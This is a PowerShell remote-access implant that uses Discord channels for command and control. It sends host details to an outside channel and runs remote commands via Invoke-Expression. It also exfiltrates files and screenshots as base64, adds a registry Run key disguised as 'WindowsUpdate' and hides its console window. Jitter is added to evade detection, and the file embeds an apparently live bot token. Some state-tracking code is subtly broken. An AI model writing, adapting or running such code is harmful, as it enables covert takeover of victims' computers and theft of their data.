# Discord C2 Client in PowerShell (Improved Version)
# This script creates a Command and Control client using Discord's REST API

# Configuration - Replace these values with your own
$BotToken = "MTM2MTQyOTI5MTU1NjAxMjE3Mg.G5wdDR.94BY1yLIM0fGZxskB-7IpQLxoTvSuR8otPKGZw" # Same token used in server
$CommandChannelId = 0  # Match with the server's COMMAND_CHANNEL_ID
$ResultChannelId = 0   # Match with the server's RESULT_CHANNEL_ID
$SleepTime = 30        # Seconds between check-ins
$AgentId = [Guid]::NewGuid().ToString()  # Generate a unique agent ID
$LastMessageId = $null # Tracks the last message ID we processed

# Add TLS 1.2 support
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Check if running with admin privileges
function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Gather system information
function Get-SystemInfo {
    $hostname = [System.Net.Dns]::GetHostName()
    $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null } | Select-Object -ExpandProperty IPAddress | Where-Object { $_ -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$' } | Select-Object -First 1)
    $isAdmin = Test-Admin
    $osVersion = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    $processes = Get-Process | Select-Object -First 10 | ForEach-Object { $_.ProcessName }
    
    return @{
        "hostname" = $hostname
        "username" = $username
        "ip" = $ip
        "is_admin" = $isAdmin
        "os_version" = $osVersion
        "running_processes" = $processes -join ", "
    }
}

# Build Discord API request headers
function Get-DiscordHeaders {
    return @{
        "Authorization" = "Bot $BotToken"
        "Content-Type" = "application/json"
        "User-Agent" = "DiscordBot (https://discord.com, v1.0)"
    }
}

# Send message to Discord channel
function Send-DiscordMessage {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ChannelId,
        [Parameter(Mandatory=$true)]
        [string]$Content
    )
    
    $endpoint = "https://discord.com/api/v9/channels/$ChannelId/messages"
    $headers = Get-DiscordHeaders
    $body = @{
        "content" = $Content
    } | ConvertTo-Json
    
    try {
        $response = Invoke-RestMethod -Uri $endpoint -Method Post -Headers $headers -Body $body
        return $response
    } catch {
        Write-Error "Failed to send message to Discord: $_"
        if ($_.Exception.Response) {
            $responseStream = $_.Exception.Response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($responseStream)
            $responseBody = $reader.ReadToEnd()
            Write-Error "Response: $responseBody"
        }
        return $null
    }
}

# Get messages from Discord channel
function Get-DiscordMessages {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ChannelId,
        [string]$AfterMessageId = $null,
        [int]$Limit = 50
    )
    
    $endpoint = "https://discord.com/api/v9/channels/$ChannelId/messages?limit=$Limit"
    if ($AfterMessageId) {
        $endpoint += "&after=$AfterMessageId"
    }
    
    $headers = Get-DiscordHeaders
    
    try {
        $response = Invoke-RestMethod -Uri $endpoint -Method Get -Headers $headers
        return $response
    } catch {
        Write-Error "Failed to get messages from Discord: $_"
        return $null
    }
}

# Function to check in with the C2 server
function Send-CheckIn {
    $sysInfo = Get-SystemInfo
    $checkInData = @{
        "agent_id" = $AgentId
        "type" = "check_in"
        "hostname" = $sysInfo.hostname
        "username" = $sysInfo.username
        "ip" = $sysInfo.ip
        "is_admin" = $sysInfo.is_admin
        "os_version" = $sysInfo.os_version
        "running_processes" = $sysInfo.running_processes
        "timestamp" = (Get-Date).ToString("o")
    } | ConvertTo-Json -Compress
    
    return (Send-DiscordMessage -ChannelId $ResultChannelId -Content $checkInData)
}

# Function to send command results back to C2
function Send-CommandResult {
    param (
        [Parameter(Mandatory=$true)]
        [string]$CommandOutput,
        [Parameter(Mandatory=$true)]
        [string]$OriginalCommand
    )
    
    # Check if output is too long for Discord (2000 char limit)
    if ($CommandOutput.Length -gt 1900) {
        # Split into chunks
        $chunks = [System.Math]::Ceiling($CommandOutput.Length / 1900)
        $resultSent = $false
        
        for ($i = 0; $i -lt $chunks; $i++) {
            $start = $i * 1900
            $length = [Math]::Min(1900, $CommandOutput.Length - $start)
            $chunk = $CommandOutput.Substring($start, $length)
            
            $resultData = @{
                "agent_id" = $AgentId
                "type" = "command_result"
                "content" = "Part $($i+1)/$chunks`: $chunk"
                "original_command" = $OriginalCommand
                "timestamp" = (Get-Date).ToString("o")
            } | ConvertTo-Json -Compress
            
            $resultSent = (Send-DiscordMessage -ChannelId $ResultChannelId -Content $resultData) -ne $null
            if (-not $resultSent) {
                break
            }
            
            # Small delay to avoid rate limiting
            Start-Sleep -Milliseconds 500
        }
        
        return $resultSent
    } else {
        $resultData = @{
            "agent_id" = $AgentId
            "type" = "command_result"
            "content" = $CommandOutput
            "original_command" = $OriginalCommand
            "timestamp" = (Get-Date).ToString("o")
        } | ConvertTo-Json -Compress
        
        return (Send-DiscordMessage -ChannelId $ResultChannelId -Content $resultData) -ne $null
    }
}

# Function to encode file as base64
function Get-FileContent {
    param (
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        $base64Content = [Convert]::ToBase64String($fileBytes)
        
        # Check if file is too large for Discord (8MB limit)
        if ($base64Content.Length -gt 5242880) { # ~4MB in base64
            return "Error: File is too large to upload through Discord (max 8MB)"
        }
        
        return "FILE:$fileName`:$base64Content"
    } catch {
        return "Error reading file: $_"
    }
}

# Function to check for commands
function Get-C2Commands {
    # Get messages from command channel
    $messages = Get-DiscordMessages -ChannelId $CommandChannelId -AfterMessageId $LastMessageId
    
    if ($messages -eq $null -or $messages.Count -eq 0) {
        return $null
    }
    
    # Update last message ID for next time
    if ($messages.Count -gt 0) {
        $LastMessageId = $messages[0].id
    }
    
    $commands = @()
    
    foreach ($message in $messages) {
        try {
            $data = $message.content | ConvertFrom-Json
            
            # Check if this is a command message
            if (($data.agent_id -eq $AgentId -or $data.agent_id -eq "all") -and $data.command) {
                $commands += $data
            }
        } catch {
            # Not a JSON message, ignore
            continue
        }
    }
    
    return $commands
}

# Function to execute a command and get its output
function Invoke-C2Command {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Command
    )
    
    try {
        # Special command handling
        if ($Command -eq "exit") {
            return "exit"
        }
        elseif ($Command -match "^download\s+(.+)$") {
            $filePath = $Matches[1]
            return Get-FileContent -FilePath $filePath
        }
        elseif ($Command -match "^screenshot$") {
            # Take screenshot
            Add-Type -AssemblyName System.Windows.Forms
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
            $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMddHHmmss').png"
            $bitmap.Save($screenshotPath)
            $graphics.Dispose()
            $bitmap.Dispose()
            
            return Get-FileContent -FilePath $screenshotPath
        }
        elseif ($Command -match "^cd\s+(.+)$") {
            $newPath = $Matches[1]
            try {
                Set-Location $newPath
                return "Changed directory to: $(Get-Location)"
            } catch {
                return "Error changing directory: $_"
            }
        }
        elseif ($Command -match "^persist$") {
            # Add persistence through Run registry key
            $scriptPath = $MyInvocation.MyCommand.Path
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $regName = "WindowsUpdate"
            
            try {
                if (Test-Admin) {
                    $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
                }
                
                New-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -PropertyType String -Force | Out-Null
                return "Persistence added at $regPath\$regName"
            } catch {
                return "Failed to add persistence: $_"
            }
        }
        else {
            # Execute the command
            $output = Invoke-Expression -Command $Command 2>&1 | Out-String
            if ([string]::IsNullOrEmpty($output)) {
                return "Command executed successfully (no output)"
            }
            return $output
        }
    } catch {
        return "Error executing command: $_"
    }
}

# Main execution loop
function Start-C2Client {
    # Initial check-in
    $checkInResponse = Send-CheckIn
    
    # Get initial LastMessageId to avoid processing old commands
    $initialMessages = Get-DiscordMessages -ChannelId $CommandChannelId -Limit 1
    if ($initialMessages -and $initialMessages.Count -gt 0) {
        $LastMessageId = $initialMessages[0].id
    }
    
    while ($true) {
        # Check for commands
        $commands = Get-C2Commands
        
        if ($commands -ne $null -and $commands.Count -gt 0) {
            foreach ($cmd in $commands) {
                # Process command
                $cmdResult = Invoke-C2Command -Command $cmd.command
                
                # Check if exit command
                if ($cmdResult -eq "exit") {
                    Write-Output "Exiting C2 client..."
                    $exitMessage = @{
                        "agent_id" = $AgentId
                        "type" = "command_result"
                        "content" = "Agent exiting"
                        "original_command" = "exit"
                        "timestamp" = (Get-Date).ToString("o")
                    } | ConvertTo-Json -Compress
                    
                    Send-DiscordMessage -ChannelId $ResultChannelId -Content $exitMessage
                    return
                }
                
                # Send command result back to C2
                Send-CommandResult -CommandOutput $cmdResult -OriginalCommand $cmd.command
            }
        }
        
        # Sleep before next check
        Start-Sleep -Seconds $SleepTime
        
        # Periodic check-in with jitter to avoid detection patterns
        $jitter = Get-Random -Minimum -5 -Maximum 5
        if ($SleepTime + $jitter -gt 0) {
            Start-Sleep -Seconds ($SleepTime + $jitter)
        }
        Send-CheckIn
    }
}

# Start the C2 client
try {
    # Hide the PowerShell window (when run as script)
    if (-not [Environment]::GetCommandLineArgs().Contains("-WindowStyle")) {
        $WindowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
        $AsyncCode = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(int handle, int state);'
        $ConsoleHandle = (Add-Type -MemberDefinition $WindowCode -Name "Win32ShowWindow" -PassThru)::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
    }
    
    # Start main loop
    Start-C2Client
} catch {
    # Log error and attempt to send it to C2
    $errorMessage = "C2 client error: $_"
    Send-CommandResult -CommandOutput $errorMessage -OriginalCommand "client_error"
} 